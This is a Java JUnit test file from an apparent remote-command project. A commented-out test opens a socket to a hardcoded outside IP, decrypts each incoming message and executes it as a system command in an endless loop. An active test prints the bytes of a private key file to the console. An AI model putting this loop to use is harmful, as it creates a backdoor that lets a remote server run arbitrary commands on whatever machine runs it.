package com.owlfloater898.bIpP;

import static org.junit.Assert.*;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.UnknownHostException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;

import javax.crypto.NoSuchPaddingException;

import org.json.simple.JSONObject;
import org.junit.BeforeClass;
import org.junit.Test;

import com.owlfloater898.bIpP.RSA.AsymmetricCryptography;
import com.owlfloater898.bIpP.RSA.Encryptyr;
import com.owlfloater898.bIpP.connections.Commands;
import com.owlfloater898.bIpP.connections.Messages;
import com.owlfloater898.bIpP.connections.Sockets;

public class MainTest
{
	/*@Test
	public void testSocketConnection() throws UnknownHostException, IOException 
	{
		Sockets sockets = new Sockets();
		Commands commands = new Commands();
		Messages messages = new Messages();
		sockets.createSocket("104.236.115.100", 4095);
		while (true)
		{
			String encryptedMessage = sockets.receiveMessage();
			String decryptedMessage = null;
			try 
			{
				decryptedMessage = messages.decryptMessage(encryptedMessage);
				System.out.println(decryptedMessage);
			}
			catch (Exception e) 
			{
				e.printStackTrace();
			}
			//JSONObject jobj = messages.getJSONObject(decryptedMessage);

				//commands.executeCommand(commands.parseCommand(commands.getCommandToExecute(jobj)));
				commands.executeCommand(commands.parseCommand(decryptedMessage));
		}

		//sockets.tearDownConnection();
		//System.out.println("done with test");
	}*/

	/*@Test 
	public void testencrptyr() throws Exception
	{
		Encryptyr enc = new Encryptyr();
		enc.encryptMessage("hello");
	}*/
	/*@Test
	public void testExecutingCommands() throws IOException
	{
		Commands commands = new Commands();
		String[] stringArray = commands.parseCommand("ping google.com");
		commands.executeCommand(stringArray);
	}*/

	/*@Test
	public void testDecryption() throws Exception
	{
		AsymmetricCryptography ac = new AsymmetricCryptography();
		Messages messages = new Messages();
		String decryptedMessage;
		String encryptedMessage = null;
		PrivateKey privateKey = ac.getPrivate("KeyPair/privateKey");
		PublicKey publicKey = ac.getPublic("KeyPair/publicKey");
		encryptedMessage = ac.encryptText("cryptography is fun", privateKey);
		System.out.println(encryptedMessage);
		decryptedMessage = messages.decryptMessage(ac , encryptedMessage);
		System.out.println("Original Message: " + "hi" +
			"\nEncrypted Message: " + encryptedMessage
			+ "\nDecrypted Message: " + decryptedMessage);
	}*/

	@Test
	public void testKeyFile() throws IOException
	{
		int cert;
		BufferedReader br = new BufferedReader(new InputStreamReader
				(new FileInputStream(new File("KeyPair/privateKey"))));
		do
		{
			cert = br.read();
			System.out.println(cert);
		}
		while(cert != -1);
	}
}


